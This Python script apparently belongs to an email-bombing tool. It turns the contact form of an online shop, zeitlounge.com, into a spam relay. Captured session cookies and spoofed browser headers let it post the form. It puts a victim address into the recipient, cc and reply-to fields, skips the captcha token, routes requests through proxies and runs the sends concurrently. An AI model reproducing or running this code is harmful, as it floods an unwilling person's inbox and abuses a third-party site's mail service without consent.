from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        import requests

        cookies = {
            'plenty_cache': '1b95c09e52c69d390e024b6a487434b0f0204e43',
            'externalID': '6405b924eb7550.7588565744743687',
            'consentActiveStatus': '[{"googleanalytics":"false","googleads":"false","facebookpixel":"true","bingads":"false","pinterest":"false","adcell":"false","econda":"false","channelpilot":"false","sendinblue":"false","hotjar":"false","moebelde":"false","intelligentreach":"false","clarity":"false","awin":"false","belboon":"false"}]',
            '_hjFirstSeen': '1',
            '_hjSession_2845702': 'eyJpZCI6IjQwYzg0ZGRkLTk2ZTAtNGQzMy04MzgxLWMwZGUwZjY1ZTVhMCIsImNyZWF0ZWQiOjE2NzgwOTY2ODAyNzEsImluU2FtcGxlIjp0cnVlfQ==',
            '_hjAbsoluteSessionInProgress': '0',
            '_ga': 'GA1.2.1789221102.1678096681',
            '_gid': 'GA1.2.250556354.1678096681',
            'NotifPopUp-1': 'Showed',
            'plenty-shop-cookie': '%7B%22necessary%22%3A%7B%22amazonPay%22%3Atrue%2C%22consent%22%3Atrue%2C%22consentActiveStatus%22%3Atrue%2C%22externalId%22%3Atrue%2C%22session%22%3Atrue%2C%22csrf%22%3Atrue%2C%22paypal-cookies%22%3Atrue%7D%2C%22tracking%22%3A%7B%22googleAnalytics%22%3Atrue%7D%2C%22marketing%22%3A%7B%22facebookpixel%22%3Afalse%7D%2C%22convenience%22%3A%7B%22languageDetection%22%3Anull%7D%2C%22_id%22%3A%22212994bb27e7a8acdd186016c5a527b5a6bebef9%22%7D',
            '_hjSessionUser_2845702': 'eyJpZCI6IjE5ODViNjhmLTM1NjktNTMzNi04Mjk5LTE3MTE4MzJiYWVkMSIsImNyZWF0ZWQiOjE2NzgwOTY2ODAyNjYsImV4aXN0aW5nIjp0cnVlfQ==',
            '_hjIncludedInPageviewSample': '1',
            '_hjIncludedInSessionSample_2845702': '0',
            'plentyID': 'eyJpdiI6IlVZUllncXpaaTRjbTR5MW1mQUIycWc9PSIsInZhbHVlIjoidVMzbHhKenVvMWVCQi9ON3VXRVVWR1cwRzhpVWpjT0RDVURTeE5mOVFOVXdhWEpWN1NQV3VEOEhINUhlUkhmeiIsIm1hYyI6Ijk4ZTY4ZjNiY2Q5MzgxMzY0MDRiYThlZTBjYjdlMGQwNDYxMGE4NjgxMGQ4YTAzMGUyZGU5MzA5YTQ4NzI1NTQiLCJ0YWciOiIifQ%3D%3D',
            '_gat': '1',
        }

        headers = {
            'authority': 'www.zeitlounge.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'plenty_cache=1b95c09e52c69d390e024b6a487434b0f0204e43; externalID=6405b924eb7550.7588565744743687; consentActiveStatus=[{"googleanalytics":"false","googleads":"false","facebookpixel":"true","bingads":"false","pinterest":"false","adcell":"false","econda":"false","channelpilot":"false","sendinblue":"false","hotjar":"false","moebelde":"false","intelligentreach":"false","clarity":"false","awin":"false","belboon":"false"}]; _hjFirstSeen=1; _hjSession_2845702=eyJpZCI6IjQwYzg0ZGRkLTk2ZTAtNGQzMy04MzgxLWMwZGUwZjY1ZTVhMCIsImNyZWF0ZWQiOjE2NzgwOTY2ODAyNzEsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=0; _ga=GA1.2.1789221102.1678096681; _gid=GA1.2.250556354.1678096681; NotifPopUp-1=Showed; plenty-shop-cookie=%7B%22necessary%22%3A%7B%22amazonPay%22%3Atrue%2C%22consent%22%3Atrue%2C%22consentActiveStatus%22%3Atrue%2C%22externalId%22%3Atrue%2C%22session%22%3Atrue%2C%22csrf%22%3Atrue%2C%22paypal-cookies%22%3Atrue%7D%2C%22tracking%22%3A%7B%22googleAnalytics%22%3Atrue%7D%2C%22marketing%22%3A%7B%22facebookpixel%22%3Afalse%7D%2C%22convenience%22%3A%7B%22languageDetection%22%3Anull%7D%2C%22_id%22%3A%22212994bb27e7a8acdd186016c5a527b5a6bebef9%22%7D; _hjSessionUser_2845702=eyJpZCI6IjE5ODViNjhmLTM1NjktNTMzNi04Mjk5LTE3MTE4MzJiYWVkMSIsImNyZWF0ZWQiOjE2NzgwOTY2ODAyNjYsImV4aXN0aW5nIjp0cnVlfQ==; _hjIncludedInPageviewSample=1; _hjIncludedInSessionSample_2845702=0; plentyID=eyJpdiI6IlVZUllncXpaaTRjbTR5MW1mQUIycWc9PSIsInZhbHVlIjoidVMzbHhKenVvMWVCQi9ON3VXRVVWR1cwRzhpVWpjT0RDVURTeE5mOVFOVXdhWEpWN1NQV3VEOEhINUhlUkhmeiIsIm1hYyI6Ijk4ZTY4ZjNiY2Q5MzgxMzY0MDRiYThlZTBjYjdlMGQwNDYxMGE4NjgxMGQ4YTAzMGUyZGU5MzA5YTQ4NzI1NTQiLCJ0YWciOiIifQ%3D%3D; _gat=1',
            'origin': 'https://www.zeitlounge.com',
            'pragma': 'no-cache',
            'referer': 'https://www.zeitlounge.com/en/contactform',
            'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        text = self.get_text()
        data = {
            'data[6401cfb9a34ff][label]': 'Name',
            'data[6401cfb9a34ff][value]': text,
            'data[6401cfb9a9a51][label]': 'Email',
            'data[6401cfb9a9a51][value]': target,
            'data[6401cfb9b0158][label]': 'Subject',
            'data[6401cfb9b0158][value]': text,
            'data[6401cfb9b032c][label]': 'Order ID',
            'data[6401cfb9b032c][value]': text,
            'data[6401cfb9b6df7][label]': 'Message',
            'data[6401cfb9b6df7][value]': text,
            'data[6401cfb9bd63b][label]': 'I hereby confirm that I have read the Privacy policy.',
            'data[6401cfb9bd63b][value]': 'true',
            'data[username][label]': '',
            'data[username][value]': '',
            'recipient': target,
            'subject': text,
            'cc[]': target,
            'replyTo[mail]': target,
            'replyTo[name]': text,
            'recaptchaToken': '',
            'templateType': 'contact',
        }

        response = requests.post('https://www.zeitlounge.com/rest/io/customer/contact/mail', cookies=cookies,
                                 headers=headers, data=data, proxies=self.get_proxies(), timeout=20)
        return response


def main():
    s = '{"events":[],"data":true}'

    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
